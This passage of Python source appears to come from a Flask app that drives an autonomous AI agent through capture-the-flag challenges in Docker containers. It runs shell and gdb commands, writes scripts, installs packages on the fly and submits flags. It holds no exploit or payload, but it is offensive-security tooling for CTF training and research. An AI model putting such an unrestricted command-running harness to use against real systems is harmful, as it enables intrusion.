            self.messages.append({
                "role": "assistant",
                "content": msg.content or "",
                "tool_calls": msg.tool_calls_raw or [],
            })

            step_had_error = False
            step_had_progress = False
            for idx, tc in enumerate(msg.tool_calls):
                fn   = tc.function.name
                if idx > 0:
                    step_had_error = True
                    self.messages.append({
                        "role": "tool",
                        "tool_call_id": tc.id,
                        "content": "[tool error] Only one tool call is allowed per turn. Re-issue with a single decisive tool call.",
                    })
                    continue
                args, arg_err = self._parse_tool_args(tc.function.arguments)
                if arg_err:
                    self.emit("error", {"message": f"Tool args error ({fn}): {arg_err}"})
                    self.messages.append({
                        "role": "tool",
                        "tool_call_id": tc.id,
                        "content": f"[tool error] invalid arguments for {fn}: {arg_err}",
                    })
                    # Defer user correction until AFTER all tool responses in this batch.
                    self._pending_directive_messages.append({"role": "user", "content":
                        f"Your tool call for '{fn}' had invalid/missing JSON arguments. "
                        f"Re-issue the tool call with valid JSON that matches the schema."
                    })
                    step_had_error = True
                    continue
                try:
                    result = self._dispatch(fn, args)
                except Exception as e:
                    result = f"[tool error] {e}"
                    self.emit("error", {"message": f"Tool error ({fn}): {e}"})
                    step_had_error = True
                if self._is_error_result(result):
                    step_had_error = True
                if self._last_tool_progress:
                    step_had_progress = True
                self.messages.append({"role": "tool", "tool_call_id": tc.id, "content": result})
                if fn == "submit_flag":
                    return
                if not self.running:
                    return
            # ── Flush deferred directive messages ─────────────────────────────────
            # _inject_directive() queues messages here instead of writing directly to
            # self.messages during dispatch, to preserve the required message ordering:
            #   assistant {tool_calls} → tool {response} → [user directives here]
            if self._pending_directive_messages:
                for dm in self._pending_directive_messages:
                    self.messages.append(dm)
                self._pending_directive_messages.clear()

            consecutive_errors = consecutive_errors + 1 if step_had_error else 0
            self._no_progress_steps = 0 if step_had_progress else (self._no_progress_steps + 1)
            evidence_changed = self._evidence_version != last_evidence_version
            if evidence_changed:
                last_evidence_version = self._evidence_version
            if self._no_progress_steps >= 2 or consecutive_errors >= 2:
                self.emit("thought", {"text": "Low information gain across recent steps. Forcing strategy shift.", "type": "system"})
                self.messages.append({"role": "user", "content":
                    self._evidence_summary()
                    + "You are stuck. Pick a NEW hypothesis class and run one decisive tool call to falsify/confirm it. "
                      "Do not repeat previous command families."
                })
                self._no_progress_steps = 0
                consecutive_errors = 0
            elif evidence_changed:
                self.messages.append({"role": "user", "content":
                    self._evidence_summary()
                    + "Evidence changed. Choose the single best next action."
                })

        if self.running:
            self.emit("done", {"status": "unsolved", "message": "Max steps reached without finding the flag."})
            self._save_retry_summary()
            update_challenge(self.cid, status="unsolved")
        self.running = False

    def _dispatch(self, fn, args):
        if fn == "run_command":
            cmd      = args["command"]
            reason   = args.get("reasoning") or "Running command."
            timeout  = 120 if args.get("long_running") else 60
            normalized_cmd = self._normalize_command(cmd)
            family = self._command_family(normalized_cmd)
            hypothesis_key = self._hypothesis_key(reason, family, normalized_cmd)
            if not args.get("long_running") and not args.get("allow_repeat") and self._is_repeated_command(normalized_cmd):
                self.emit("thought", {"text": f"Blocked repeated command with no new signal: {normalized_cmd}", "type": "system"})
                self._last_tool_progress = False
                return f"[error] blocked repeated command: {normalized_cmd}"
            hypothesis_budget = self.hypothesis_budget
            if self.category == "web":
                hypothesis_budget = min(hypothesis_budget, 1)
            if not args.get("long_running") and self._hypothesis_no_progress.get(hypothesis_key, 0) >= hypothesis_budget:
                self.emit("thought", {
                    "text": f"Hypothesis budget exceeded for '{hypothesis_key[:40]}'. Pivot required.",
                    "type": "system",
                })
                self._next_hypothesis = "Choose a different hypothesis class with a different command family."
                self._last_tool_progress = False
                return f"[error] hypothesis budget exceeded: {hypothesis_key}"
            family_budget = 2
            if self.category == "web":
                family_budget = 1
            if not args.get("long_running") and self._family_no_progress.get(family, 0) >= family_budget:
                self.emit("thought", {"text": f"Blocked low-yield command family '{family}'. Try a different strategy.", "type": "system"})
                self._last_tool_progress = False
                return f"[error] blocked low-yield command family: {family}"
            self.emit("thought", {"text": reason, "type": "reasoning"})
            python_cmd = re.match(r"^\s*python(3(\.\d+)*)?\b", cmd) is not None
            # Preflight: if running a python script, ensure imports are installed in /ctf/.venv
            m = re.match(r"^\s*python(3(\.\d+)*)?\s+([^\s]+\.py)\b", cmd)
            if m and self.allow_runtime_installs:
                script = m.group(3)
                qscript = _shell_quote(script)
                self.container.run("python3 -m venv /ctf/.venv || true")
                check = self.container.run(
                    "/ctf/.venv/bin/python - "
                    + qscript +
                    " <<'PY'\n"
                    "import ast, sys, importlib.util\n"
                    "path = sys.argv[1]\n"
                    "tree = ast.parse(open(path,'rb').read(), filename=path)\n"
                    "mods = []\n"
                    "for node in ast.walk(tree):\n"
                    "    if isinstance(node, ast.Import):\n"
                    "        for n in node.names:\n"
                    "            mods.append(n.name.split('.')[0])\n"
                    "    elif isinstance(node, ast.ImportFrom):\n"
                    "        if node.module:\n"
                    "            mods.append(node.module.split('.')[0])\n"
                    "missing = []\n"
                    "seen = set()\n"
                    "for mod in mods:\n"
                    "    if mod in seen:\n"
                    "        continue\n"
                    "    seen.add(mod)\n"
                    "    if importlib.util.find_spec(mod) is None:\n"
                    "        missing.append(mod)\n"
                    "print('\\n'.join(missing))\n"
                    "PY"
                )
                missing_mods = [ln.strip() for ln in (check or '').splitlines() if ln.strip()]
                if missing_mods:
                    pkgs = [_infer_pip_package(mn) for mn in missing_mods]
                    self.emit("thought", {"text": f"Preflight: installing Python deps in /ctf/.venv: {', '.join(pkgs)}", "type": "system"})
                    self.container.run("/ctf/.venv/bin/python -m pip -q install --upgrade pip || true")
                    self.container.run(f"/ctf/.venv/bin/python -m pip -q install {' '.join(pkgs)} || true")
            cmd_to_run = cmd
            if python_cmd:
                self.container.run("python3 -m venv /ctf/.venv || true")
                cmd_to_run = re.sub(r"^\s*python(3(\.\d+)*)?\b", "/ctf/.venv/bin/python", cmd, count=1)
            # Binwalk extraction requires explicit run user in current versions.
            if re.match(r"^\s*binwalk\b", cmd_to_run) and "--run-as=" not in cmd_to_run:
                cmd_to_run = re.sub(r"^\s*binwalk\b", "binwalk --run-as=root", cmd_to_run, count=1)

            self.emit("command", {"cmd": cmd})
            self._record_command(normalized_cmd)
            out = self.container.run(cmd_to_run, timeout=timeout)
            missing_cmd = self._extract_missing_command(out or "")
            if missing_cmd:
                out_retry = self._maybe_install_and_retry_missing_tool(missing_cmd, cmd_to_run, timeout)
                if out_retry:
                    out = out_retry
            # Auto-fix missing Python modules by installing in a venv and retrying once.
            missing = re.search(r"No module named ['\"]([^'\"]+)['\"]", out or "")
            if missing and self.allow_runtime_installs:
                mod = missing.group(1)
                pkg = _infer_pip_package(mod)
                if pkg:
                    self.emit("thought", {"text": f"Missing Python module '{mod}'. Installing '{pkg}' in /ctf/.venv and retrying…", "type": "system"})
                    self.container.run("python3 -m venv /ctf/.venv || true")
                    self.container.run("/ctf/.venv/bin/python -m pip -q install --upgrade pip || true")
                    self.container.run(f"/ctf/.venv/bin/python -m pip -q install {pkg} || true")
                    # Re-run using the venv python via PATH
                    rerun = re.sub(r"^\s*python(3(\.\d+)*)?\b", "/ctf/.venv/bin/python", cmd, count=1)
                    self.emit("command", {"cmd": rerun})
                    out2 = self.container.run(rerun, timeout=timeout)
                    if out2:
                        out = out2
            self.emit("output", {"text": out})
            self._update_evidence_from_output(cmd, out)
            self._last_cmd_status[normalized_cmd] = {"error": self._is_error_result(out)}
            if self._maybe_auto_submit_from_output(out, source=f"run_command: {cmd}"):
                self._last_tool_progress = True
                return f"Flag auto-submitted from output."
            hint_progress = self._try_hint_actions()
            progress = self._score_progress(out)
            if hint_progress:
                progress = True
            self._last_tool_progress = progress
            if progress:
                self._family_no_progress[family] = 0
                self._hypothesis_no_progress[hypothesis_key] = 0
                self._next_hypothesis = ""
            else:
                self._family_no_progress[family] = self._family_no_progress.get(family, 0) + 1
                self._hypothesis_no_progress[hypothesis_key] = self._hypothesis_no_progress.get(hypothesis_key, 0) + 1
                if self._hypothesis_no_progress[hypothesis_key] >= self.hypothesis_budget:
                    self._add_evidence("ruled_out", f"Hypothesis exhausted: {hypothesis_key[:80]}")
                    self._next_hypothesis = "Switch to a new hypothesis and different command family."
            # Emit error event for dashboard if output shows a failure
            if out and re.search(r"Traceback|ModuleNotFoundError|No such file or directory|command not found|\berror:", out, re.IGNORECASE):
                first = out.strip().splitlines()[0] if out.strip() else "Command error"
                self.emit("error", {"message": first, "cmd": cmd})
            return self._truncate_for_context(out)

        elif fn == "run_gdb":
            binary = args["binary_path"]
            cmds   = args["gdb_commands"]
            label  = f"gdb {binary} [{', '.join(cmds[:2])}{'…' if len(cmds)>2 else ''}]"
            self.emit("command", {"cmd": label, "gdb": True})
            out = self.container.run_gdb(binary, cmds)
            self.emit("output", {"text": out})
            self._update_evidence_from_output(label, out)
            if self._maybe_auto_submit_from_output(out, source=f"run_gdb: {binary}"):
                self._last_tool_progress = True
                return f"Flag auto-submitted from output."
            hint_progress = self._try_hint_actions()
            self._last_tool_progress = self._score_progress(out)
            if hint_progress:
                self._last_tool_progress = True
            return self._truncate_for_context(out)

        elif fn == "write_file":
            fname   = args.get("filename", "").lstrip("/").replace("../", "").strip()
            content = args.get("content", "")
            reason  = args.get("reasoning") or "Writing file for the next step."
            if not fname:
                self._last_tool_progress = False
                return "[error] filename is required"
            self.emit("thought", {"text": reason, "type": "reasoning"})
            self.emit("command", {"cmd": f"write_file: {fname}"})
            try:
                remote_path = self.container.write_file(fname, content)
                # Make scripts executable
                if fname.endswith((".py", ".sh", ".rb", ".pl")):
                    self.container.run(f"chmod +x {remote_path}")
                out = f"Written {len(content.encode())} bytes to {remote_path}"
                self.emit("output", {"text": out})
                self._last_tool_progress = True
                return out
            except Exception as e:
                err = f"[tool error] write_file failed: {e}"
                self.emit("error", {"message": str(e)})
                self._last_tool_progress = False
                return err

        elif fn == "search_flag":
            pattern = args.get("flag_pattern", "").strip() or self.flag_format or "flag{"
            qpat = _shell_quote(pattern)
            cmd = (
                f"grep -r --include='*' -E {qpat} /ctf/ 2>/dev/null | head -50; "
                "ec=$?; "
                f"if [ $ec -eq 2 ]; then grep -r --include='*' -F {qpat} /ctf/ 2>/dev/null | head -50; fi"
            )
            self.emit("command", {"cmd": f"search_flag: {pattern}"})
            out = self.container.run(cmd, timeout=60)
            self.emit("output", {"text": out})
            self._update_evidence_from_output(f"search_flag: {pattern}", out)
            if self._maybe_auto_submit_from_output(out, source=f"search_flag: {pattern}"):
                self._last_tool_progress = True
                return f"Flag auto-submitted from output."
            hint_progress = self._try_hint_actions()
            self._last_tool_progress = self._score_progress(out)
            if hint_progress:
                self._last_tool_progress = True
            return self._truncate_for_context(out)

        elif fn == "submit_flag":
            flag = args["flag"]
            how  = args.get("how_found", "")
            if not self._flag_matches_format(flag):
                msg = f"Submitted flag does not match expected format '{self.flag_format}'. Keep searching."
                self.emit("error", {"message": msg, "flag": flag})
                self._last_tool_progress = False
                return f"[error] {msg}"
            update_challenge(self.cid, status="solved", flag=flag)
            self.emit("flag", {"flag": flag, "how": how})
            self.emit("done", {"status": "solved"})
            self.running = False
            self._last_tool_progress = True
            return f"Flag: {flag}"

        self._last_tool_progress = False
        return f"Unknown: {fn}"


def _safe_float(value, default: float) -> float:
    try:
        return float(value)
    except Exception:
        return default

def build_capability_report(challenges: list[dict] | None = None, cfg: dict | None = None) -> dict:
    cfg = cfg or load_config()
    chals = challenges if challenges is not None else load_challenges()
    per_cat = {c: {"total": 0, "solved": 0} for c in CATEGORIES}

    solved_total = 0
    for ch in chals:
        cat = (ch.get("category") or "misc").lower()
        if cat not in per_cat:
            per_cat[cat] = {"total": 0, "solved": 0}
        per_cat[cat]["total"] += 1
        if ch.get("status") == "solved":
            per_cat[cat]["solved"] += 1
            solved_total += 1

    min_total = int(cfg.get("broad_eval_min_total_challenges") or 100)
    min_categories = int(cfg.get("broad_eval_min_categories") or 5)
    min_per_category = int(cfg.get("broad_eval_min_challenges_per_category") or 10)
    min_solve_rate = _safe_float(cfg.get("broad_eval_min_solve_rate"), 0.60)

    categories_meeting_bar = []
    by_category = {}
    for cat, stats in sorted(per_cat.items()):
        total = stats["total"]
        solved = stats["solved"]
        rate = (solved / total) if total else 0.0
        meets = total >= min_per_category and rate >= min_solve_rate
        if meets:
            categories_meeting_bar.append(cat)
        by_category[cat] = {
            "total": total,
            "solved": solved,
            "solve_rate": round(rate, 4),
            "meets_bar": meets,
        }

    overall_rate = (solved_total / len(chals)) if chals else 0.0
    broad_ready = (
        len(chals) >= min_total and
        len(categories_meeting_bar) >= min_categories
    )

    return {
        "generated_at": datetime.utcnow().isoformat() + "Z",
        "overall": {
            "total": len(chals),
            "solved": solved_total,
            "solve_rate": round(overall_rate, 4),
        },
        "thresholds": {
            "min_total_challenges": min_total,
            "min_categories_meeting_bar": min_categories,
            "min_challenges_per_category": min_per_category,
            "min_solve_rate": min_solve_rate,
        },
        "categories_meeting_bar": categories_meeting_bar,
        "by_category": by_category,
        "broad_ctf_ready": broad_ready,
        "readiness_note": (
            "Readiness bar met for broad CTF claims."
            if broad_ready else
            "Readiness bar not met yet; use this report as the source of truth for capability claims."
        ),
    }


# Active agents registry
_agents: dict[str, CTFAgent] = {}
_logs: dict[str, list[dict]] = {}

def _log_event(cid: str, event: str, data: dict):
    if not cid:
        return
    buf = _logs.setdefault(cid, [])
    buf.append({"ts": time.time(), "event": event, "data": data})
    # cap log size to avoid unbounded growth
    if len(buf) > 2000:
        del buf[:200]

# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")

# Challenges CRUD
@app.route("/api/challenges", methods=["GET"])
def get_challenges():
    return jsonify([_with_runtime(c) for c in load_challenges()])

@app.route("/api/challenges", methods=["POST"])
def create_challenge():
    data = request.json
    chal = {
        "id":            str(uuid.uuid4())[:8],
        "name":          data.get("name", "Untitled"),
        "category":      data.get("category", "misc"),
        "flag_format":   data.get("flag_format", ""),
        "description":   data.get("description", ""),
        "files":         [],
        "status":        "unsolved",
        "flag":          None,
        "retry_summary": None,
        "created_at":    datetime.now().isoformat(),
        "cost_usd":      0.0,
        "tokens_in":     0,
        "tokens_out":    0,
    }
    with _db_lock:
        chals = _load_challenges_unlocked()
        chals.append(chal)
        _save_challenges_unlocked(chals)
    return jsonify(chal)

@app.route("/api/challenges/<cid>", methods=["GET"])
def get_challenge_route(cid):
    chal = get_challenge(cid)
    if not chal:
        return jsonify({"error": "Not found"}), 404
    return jsonify(_with_runtime(chal))

@app.route("/api/challenges/<cid>/logs", methods=["GET"])
def get_challenge_logs(cid):
    if not get_challenge(cid):
        return jsonify({"error": "Not found"}), 404
    return jsonify(_logs.get(cid, []))

@app.route("/api/challenges/<cid>", methods=["PUT"])
def update_challenge_route(cid):
    data = request.json
    update_challenge(cid, **data)
    return jsonify(get_challenge(cid))

@app.route("/api/challenges/<cid>", methods=["DELETE"])
def delete_challenge(cid):
    if cid in _containers:
        threading.Thread(target=_containers[cid].stop, daemon=True).start()
        del _containers[cid]
    if cid in _agents:
        _agents[cid].stop()
        del _agents[cid]
    with _db_lock:
        chals = [c for c in _load_challenges_unlocked() if c["id"] != cid]
        _save_challenges_unlocked(chals)
    return jsonify({"ok": True})

# File upload
@app.route("/api/challenges/<cid>/upload", methods=["POST"])
def upload_file(cid):
    chal = get_challenge(cid)
    if not chal:
        return jsonify({"error": "Challenge not found"}), 404

    if "file" not in request.files:
        return jsonify({"error": "No file"}), 400

    f     = request.files["file"]
    fname = secure_filename(f.filename)
    if not fname:
        return jsonify({"error": "Invalid filename"}), 400

    # Use per-challenge subdirectory to prevent filename collisions across challenges
    chal_upload_dir = UPLOAD_DIR / cid
    chal_upload_dir.mkdir(exist_ok=True)
    local = chal_upload_dir / fname
    f.save(str(local))

    try:
        container = get_container(cid)
        remote    = container.upload_file(str(local))
        listing   = container.run("ls -lh /ctf/")
        files     = chal.get("files", [])
        if fname not in files:
            files.append(fname)
        update_challenge(cid, files=files)
        socketio.emit("file_uploaded", {"name": fname, "listing": listing}, room=cid)
        return jsonify({"ok": True, "name": fname, "remote": remote, "listing": listing})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Agent control
@app.route("/api/challenges/<cid>/launch", methods=["POST"])
def launch_agent(cid):
    data  = request.json or {}
    retry = data.get("retry", False)
    chal  = get_challenge(cid)
    if not chal:
        return jsonify({"error": "Not found"}), 404
    if not image_exists():
        return jsonify({"error": "Docker image not built"}), 400

    if cid in _agents and _agents[cid].running:
        return jsonify({"error": "Agent already running"}), 400

    try:
        container = get_container(cid)
        sync_challenge_uploads(cid, container)
    except Exception as e:
        return jsonify({"error": f"Container failed: {e}"}), 500

    flag_fmt  = chal.get("flag_format", "")
    extra     = data.get("extra_context", "")
    full_desc = (
        f"Challenge: {chal['name']}\n"
        f"Category: {chal['category'].upper()}\n"
        f"Working directory: /ctf/\n"
        + (f"Flag format: {flag_fmt}\n" if flag_fmt else "")
        + (f"\n{chal.get('description', '')}\n" if chal.get("description") else "")
        + (f"\nAdditional context: {extra}\n" if extra else "")
    )

    prior = chal.get("retry_summary") if retry else None
    update_challenge(cid, status="solving")

    agent = CTFAgent(
        cid,
        chal.get("category", "misc"),
        container,
        room=cid,
        flag_format=chal.get("flag_format", ""),
    )
    _agents[cid] = agent
    agent.start(full_desc, prior_summary=prior)

    return jsonify({"ok": True})

@app.route("/api/challenges/<cid>/stop", methods=["POST"])
def stop_agent(cid):
    if cid in _agents:
        _agents[cid].stop()
        del _agents[cid]
    if cid in _containers:
        threading.Thread(target=_containers[cid].stop, daemon=True).start()
        del _containers[cid]
    update_challenge(cid, status="unsolved")
    socketio.emit("done", {"cid": cid, "status": "unsolved", "message": "Stopped by user."}, room=cid)
    return jsonify({"ok": True})

@app.route("/api/challenges/<cid>/reset", methods=["POST"])
def reset_container(cid):
    if cid in _agents:
        _agents[cid].stop()
    if cid in _containers:
        _containers[cid].stop()
        del _containers[cid]
    update_challenge(cid, files=[], status="unsolved", flag=None, retry_summary=None)
    return jsonify({"ok": True})

@app.route("/api/evaluation/summary", methods=["GET"])
def evaluation_summary():
    return jsonify(build_capability_report())

# Docker management
@app.route("/api/docker/status", methods=["GET"])
def docker_status():
    try:
        get_docker().ping()
        has_image = image_exists()
        running_agents = sum(1 for a in _agents.values() if getattr(a, "running", False))
        return jsonify({"running": True, "image": has_image, "active_agents": running_agents})
    except Exception as e:
        return jsonify({"running": False, "error": str(e), "active_agents": 0})

@app.route("/api/docker/build", methods=["POST"])
def build_image():
    def _build():
        try:
            socketio.emit("build_log", {"line": "Starting build...", "done": False})
            client = get_docker()
            for log in client.api.build(
                path=str(BASE_DIR),
                tag=IMAGE_NAME,
                rm=True,
                platform="linux/amd64",
                decode=True,
            ):
                if "stream" in log:
                    line = log["stream"].strip()
                    if line:
                        socketio.emit("build_log", {"line": line, "done": False})
                elif "error" in log:
                    socketio.emit("build_log", {"line": f"ERROR: {log['error']}", "done": True, "error": True})
                    return
            socketio.emit("build_log", {"line": "✓ Image built successfully!", "done": True, "error": False})
        except Exception as e:
            socketio.emit("build_log", {"line": f"Build failed: {e}", "done": True, "error": True})

    threading.Thread(target=_build, daemon=True).start()
    return jsonify({"ok": True})

# Socket.IO — join challenge room for real-time updates
@socketio.on("join")
def on_join(data):
    from flask_socketio import join_room
    cid = data.get("cid")
    if cid:
        join_room(cid)

if __name__ == "__main__":
    print("\n  Big Stein (The Penetrator)")
    print("  ─────────────────────────────")
    print("  Open http://localhost:7331\n")
    socketio.run(app, host="0.0.0.0", port=7331, debug=False, allow_unsafe_werkzeug=True)
